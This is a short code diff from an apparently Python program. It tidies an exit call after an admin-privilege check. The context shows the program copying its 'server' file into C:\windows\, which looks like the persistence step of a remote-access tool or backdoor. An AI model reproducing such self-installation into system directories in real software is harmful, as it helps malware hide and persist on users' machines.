@@ -24,7 +24,7 @@ class main:
         if is_admin != 1 :
                 print("need admin privileges!")
                 os.system("pause")
-                raise SystemExit
+                raise SystemExit()
                 
         #copiamo il server nella directory di sistema
         copy(dir_path, "C:\\windows\\")
